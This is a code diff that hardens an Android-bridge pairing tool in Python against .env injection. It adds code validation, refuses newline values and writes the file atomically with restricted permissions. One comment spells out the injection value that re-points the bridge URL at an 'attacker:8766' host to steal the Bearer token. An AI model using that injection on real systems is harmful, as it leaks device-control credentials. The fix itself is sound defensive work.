@@ -11,6 +11,8 @@ via ctx.register_tool().
 
 import json
 import os
+import re
+import tempfile
 import time
 import requests
 from typing import Optional
@@ -989,6 +991,15 @@ def android_setup(pairing_code: str) -> str:
     Call this when the user provides their pairing code from the Hermes Bridge app.
     Example: android_setup("K7V3NP")
     """
+    rejection = _pairing_code_error(pairing_code)
+    if rejection is not None:
+        # PY-1: the code is written into ~/.hermes/.env, which is parsed as
+        # key=value lines. An unvalidated value can inject extra keys — a newline
+        # plus ANDROID_BRIDGE_URL=http://attacker:8766 re-points every later tool
+        # call at an attacker host with the real Bearer token attached.
+        return json.dumps(
+            {"status": "error", "message": f"Invalid pairing code: {rejection}"}
+        )
     try:
         port = _relay_port()
         public_ip = _get_public_ip()
@@ -1004,7 +1015,10 @@ def android_setup(pairing_code: str) -> str:
         except ImportError:
             from pathlib import Path
 
-            env_path = Path.home() / ".hermes" / ".env"
+            # Same resolution order as _env_file_vars(), which is where the token
+            # is read back from — writing anywhere else silently does nothing.
+            hermes_home = os.environ.get("HERMES_HOME") or str(Path.home() / ".hermes")
+            env_path = Path(hermes_home) / ".env"
             env_path.parent.mkdir(parents=True, exist_ok=True)
             _update_env_file(env_path, "ANDROID_BRIDGE_URL", relay_url)
             _update_env_file(env_path, "ANDROID_BRIDGE_TOKEN", pairing_code)
@@ -1066,27 +1080,81 @@ def android_setup(pairing_code: str) -> str:
         return json.dumps({"status": "error", "message": _safe_error(e)})
 
 
+# ── Pairing-code validation (PY-1) ───────────────────────────────────────────
+#
+# Codes are generated on the phone by PairingManager.regenerateCode(): 6
+# characters from "ABCDEFGHJKLMNPQRSTUVWXYZ23456789" (no 0/O/1/I). The upper
+# bound here is generous so a future longer code still works; the charset is what
+# makes .env injection impossible.
+_PAIRING_CODE_RE = re.compile(r"[A-HJ-NP-Z2-9]{6,32}")
+_ENV_KEY_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")
+
+
+def _pairing_code_error(pairing_code) -> Optional[str]:
+    """Return why *pairing_code* is unusable, or None when it is.
+
+    Never echoes the value: it is a credential that grants full device control.
+    """
+    if not isinstance(pairing_code, str):
+        return "pairing_code must be a string"
+    if "\n" in pairing_code or "\r" in pairing_code:
+        return "pairing_code must not contain line breaks"
+    if not _PAIRING_CODE_RE.fullmatch(pairing_code):
+        return (
+            "pairing_code must be 6-32 characters from A-Z (without I and O) and "
+            "2-9 — exactly the code shown in the Hermes Bridge app"
+        )
+    return None
+
+
 def _update_env_file(env_path, key: str, value: str):
-    """Simple .env file updater (fallback when hermes_cli.config not available)."""
+    """Simple .env file updater (fallback when hermes_cli.config not available).
+
+    Hardened for PY-1:
+      * a value containing CR or LF is refused — defence in depth behind
+        _pairing_code_error(), so the guarantee does not depend on every caller
+        validating first;
+      * the key must be a bare NAME, so a crafted key cannot terminate the line;
+      * the write is atomic and 0600 from creation (mkstemp + os.replace) rather
+        than write-then-chmod, so the token is never world-readable in a window
+        and a pre-existing loose file mode is not inherited.
+    """
+    if not isinstance(key, str) or not _ENV_KEY_RE.fullmatch(key):
+        raise ValueError("invalid .env key")
+    text = "" if value is None else str(value)
+    if "\n" in text or "\r" in text:
+        raise ValueError(f"refusing to write a multi-line value for {key}")
+
     lines = []
     if env_path.exists():
         lines = env_path.read_text(encoding="utf-8", errors="replace").splitlines(True)
     found = False
     for i, line in enumerate(lines):
         if line.strip().startswith(f"{key}="):
-            lines[i] = f"{key}={value}\n"
+            lines[i] = f"{key}={text}\n"
             found = True
             break
     if not found:
         if lines and not lines[-1].endswith("\n"):
             lines[-1] += "\n"
-        lines.append(f"{key}={value}\n")
-    env_path.write_text("".join(lines), encoding="utf-8")
-    # Restrict permissions: .env may contain the pairing token (full device access).
+        lines.append(f"{key}={text}\n")
+
+    fd, tmp_name = tempfile.mkstemp(
+        dir=str(env_path.parent), prefix=f".{env_path.name}.", suffix=".tmp"
+    )
     try:
-        env_path.chmod(0o600)
-    except OSError:
-        pass
+        with os.fdopen(fd, "w", encoding="utf-8") as fh:
+            fh.write("".join(lines))
+            fh.flush()
+            os.fsync(fh.fileno())
+        os.chmod(tmp_name, 0o600)
+        os.replace(tmp_name, env_path)
+    except BaseException:
+        try:
+            os.unlink(tmp_name)
+        except OSError:
+            pass
+        raise
 
 
 # ── Schema definitions ─────────────────────────────────────────────────────────
@@ -1286,7 +1354,8 @@ _SCHEMAS = {
             "properties": {
                 "pairing_code": {
                     "type": "string",
-                    "description": "6-character pairing code shown in the Hermes Bridge app on the phone",
+                    "description": "6-character pairing code shown in the Hermes Bridge app on the phone (A-Z without I/O, and 2-9)",
+                    "pattern": "^[A-HJ-NP-Z2-9]{6,32}$",
                 },
             },
             "required": ["pairing_code"],
